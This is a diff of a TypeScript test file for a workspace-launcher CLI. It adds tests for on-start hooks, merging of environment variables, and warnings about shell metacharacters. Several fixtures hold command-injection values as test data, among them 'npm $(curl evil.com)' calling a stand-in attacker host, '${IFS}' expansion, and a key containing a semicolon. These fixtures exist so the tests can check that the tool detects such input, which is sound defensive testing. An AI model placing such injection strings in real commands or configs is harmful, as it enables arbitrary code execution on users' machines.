@@ -167,6 +167,7 @@ describe("script execution", () => {
       "/tmp/workspace",
       expect.any(String),
       null,
+      undefined,
     );
   });
 
@@ -824,6 +825,7 @@ describe("falsy sidebarCommand guard", () => {
       "/tmp/workspace",
       expect.any(String),
       null,
+      undefined,
     );
   });
 
@@ -841,6 +843,7 @@ describe("falsy sidebarCommand guard", () => {
       "/tmp/workspace",
       expect.any(String),
       null,
+      undefined,
     );
   });
 });
@@ -975,6 +978,7 @@ describe("command resolution cache for shared binaries (#61)", () => {
       "/tmp/workspace",
       expect.any(String),
       null,
+      undefined,
     );
   });
 });
@@ -1161,6 +1165,7 @@ describe("path resolution", () => {
       "/tmp/workspace",
       expect.any(String),
       null,
+      undefined,
     );
   });
 
@@ -1182,6 +1187,7 @@ describe("path resolution", () => {
       "/tmp/workspace",
       expect.any(String),
       null,
+      undefined,
     );
   });
 });
@@ -1294,6 +1300,26 @@ describe("shell metacharacter confirmation (#90)", () => {
   it("prompts when .summon file contains $( in command values", async () => {
     mockReadKVFile.mockReturnValue(
       new Map([["shell", "npm $(curl evil.com)"]]),
+    );
+    vi.mocked(listConfig).mockReturnValue(new Map());
+
+    mockQuestion.mockImplementation((_q: string, cb: (a: string) => void) => {
+      cb("y");
+    });
+
+    const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+    await launch("/tmp/workspace");
+
+    expect(warnSpy).toHaveBeenCalledWith(
+      expect.stringContaining("shell metacharacters"),
+    );
+    warnSpy.mockRestore();
+  });
+
+  it("prompts when .summon file contains ${} parameter expansion (#119)", async () => {
+    mockReadKVFile.mockReturnValue(
+      new Map([["shell", "echo ${IFS}evil"]]),
     );
     vi.mocked(listConfig).mockReturnValue(new Map());
 
@@ -1565,6 +1591,7 @@ describe("shell metacharacter confirmation (#90)", () => {
         "/tmp/workspace",
         expect.any(String),
         "/mock/.config/summon/starship/tokyo-night.toml",
+        undefined,
       );
     });
 
@@ -1578,6 +1605,7 @@ describe("shell metacharacter confirmation (#90)", () => {
         "/tmp/workspace",
         expect.any(String),
         null,
+        undefined,
       );
     });
 
@@ -1595,6 +1623,7 @@ describe("shell metacharacter confirmation (#90)", () => {
         "/tmp/workspace",
         expect.any(String),
         null,
+        undefined,
       );
       warnSpy.mockRestore();
     });
@@ -1616,6 +1645,7 @@ describe("shell metacharacter confirmation (#90)", () => {
         "/tmp/workspace",
         expect.any(String),
         null,
+        undefined,
       );
       warnSpy.mockRestore();
     });
@@ -1676,6 +1706,7 @@ describe("shell metacharacter confirmation (#90)", () => {
         "/tmp/workspace",
         expect.any(String),
         "/mock/.config/summon/starship/tokyo-night.toml",
+        undefined,
       );
       logSpy.mockRestore();
     });
@@ -1688,6 +1719,100 @@ describe("shell metacharacter confirmation (#90)", () => {
 
       expect(mockEnsurePresetConfig).not.toHaveBeenCalled();
       logSpy.mockRestore();
+    });
+  });
+
+  describe("on-start hook (#107)", () => {
+    it("executes on-start command before workspace creation", async () => {
+      vi.mocked(listConfig).mockReturnValue(new Map());
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace", { "on-start": "echo setup" });
+
+      // execSync should have been called with the on-start command
+      const onStartCalls = mockExecSync.mock.calls.filter(
+        (c: unknown[]) => c[0] === "echo setup",
+      );
+      expect(onStartCalls.length).toBe(1);
+      expect(onStartCalls[0]![1]).toEqual(
+        expect.objectContaining({ cwd: "/tmp/workspace", stdio: "inherit" }),
+      );
+
+      // generateAppleScript should also have been called (workspace created)
+      expect(mockGenerateAppleScript).toHaveBeenCalled();
+      logSpy.mockRestore();
+    });
+
+    it("aborts launch if on-start command fails", async () => {
+      vi.mocked(listConfig).mockReturnValue(new Map());
+      mockExecSync.mockImplementation((cmd: string) => {
+        if (cmd === "false") throw new Error("Command failed");
+        return "";
+      });
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+      const errorSpy = vi.spyOn(console, "error").mockImplementation(() => {});
+      const mockExit = vi.spyOn(process, "exit").mockImplementation(() => {
+        throw new Error("process.exit");
+      });
+
+      await expect(launch("/tmp/workspace", { "on-start": "false" })).rejects.toThrow("process.exit");
+      expect(mockExit).toHaveBeenCalledWith(1);
+      expect(errorSpy).toHaveBeenCalledWith("on-start command failed: false");
+
+      logSpy.mockRestore();
+      errorSpy.mockRestore();
+      mockExit.mockRestore();
+    });
+
+    it("skips on-start in dry-run mode", async () => {
+      vi.mocked(listConfig).mockReturnValue(new Map());
+      const logSpy = vi.spyOn(console, "log").mockImplementation(() => {});
+
+      await launch("/tmp/workspace", { "on-start": "echo setup", dryRun: true });
+
+      const onStartCalls = mockExecSync.mock.calls.filter(
+        (c: unknown[]) => c[0] === "echo setup",
+      );
+      expect(onStartCalls.length).toBe(0);
+      logSpy.mockRestore();
+    });
+  });
+
+  describe("env var collection (#108)", () => {
+    it("collects env vars from .summon project file", () => {
+      mockReadKVFile.mockReturnValue(new Map([["env.NODE_ENV", "development"]]));
+      vi.mocked(listConfig).mockReturnValue(new Map());
+
+      const result = resolveConfig("/tmp/workspace", {});
+      expect(result.envVars).toEqual({ NODE_ENV: "development" });
+    });
+
+    it("merges CLI > project > machine env vars", () => {
+      mockReadKVFile.mockReturnValue(new Map([["env.A", "project"]]));
+      vi.mocked(listConfig).mockReturnValue(new Map([["env.A", "machine"], ["env.B", "machine"]]));
+
+      const result = resolveConfig("/tmp/workspace", { env: ["A=cli"] });
+      expect(result.envVars.A).toBe("cli"); // CLI wins
+      expect(result.envVars.B).toBe("machine"); // machine fills in
+    });
+
+    it("rejects invalid env var key names from .summon", () => {
+      mockReadKVFile.mockReturnValue(new Map([["env.VALID_KEY", "ok"], ["env.bad;key", "evil"]]));
+      vi.mocked(listConfig).mockReturnValue(new Map());
+      const warnSpy = vi.spyOn(console, "warn").mockImplementation(() => {});
+
+      const result = resolveConfig("/tmp/workspace", {});
+      expect(result.envVars).toEqual({ VALID_KEY: "ok" });
+      expect(warnSpy).toHaveBeenCalledWith(expect.stringContaining("bad;key"));
+      warnSpy.mockRestore();
+    });
+
+    it("returns empty object when no env vars configured", () => {
+      mockReadKVFile.mockReturnValue(new Map());
+      vi.mocked(listConfig).mockReturnValue(new Map());
+
+      const result = resolveConfig("/tmp/workspace", {});
+      expect(result.envVars).toEqual({});
     });
   });
 });
